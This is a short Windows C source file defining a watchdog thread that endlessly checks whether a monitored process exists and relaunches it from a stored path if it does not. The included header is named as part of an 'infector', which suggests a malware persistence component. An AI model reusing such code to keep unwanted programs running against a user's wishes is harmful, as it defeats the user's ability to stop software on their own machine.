#include <Windows.h>
#include <winternl.h>

#include "x86-watchdog-infector.h"

DWORD WINAPI
ThreadProc(_In_ LPVOID lpParameter)
{
  monitor_proc_id(lpParameter);
}

int
monitor_proc_id(struct watchdog_info* map)
{
  ULONGLONG tick_proc_id_unchanged = 0;
  ULONGLONG proc_id_cache = 0;
  PROCESS_INFORMATION proc_info;
  STARTUPINFO start_info;

  do {

    if (InterlockedCompareExchange(&map->lock, 1, 0) == 0) {
      if (process_exists(map->proc_id) == FALSE) {
        memset(&proc_info, 0, sizeof proc_info);
        memset(&start_info, 0, sizeof start_info);

        start_info.cb = sizeof start_info;

        if (CreateProcessW(map->path,
                           NULL,
                           NULL,
                           NULL,
                           0,
                           0,
                           NULL,
                           NULL,
                           &start_info,
                           &proc_info)) {
          map->proc_id = (ULONGLONG)proc_info.dwProcessId;

          CloseHandle(proc_info.hProcess);
          CloseHandle(proc_info.hThread);
        } else {
          Sleep(100);
          map->lock = 0;
        }
      }
    } else {
      if (proc_id_cache == map->proc_id &&
          process_exists(map->proc_id) == FALSE) {
        ++tick_proc_id_unchanged;
      } else {
        proc_id_cache = map->proc_id;
      }

      if (tick_proc_id_unchanged > 100) {
        map->lock = 0;
      }
    }

    Sleep(100);
  } while (1);

  return 0;
}
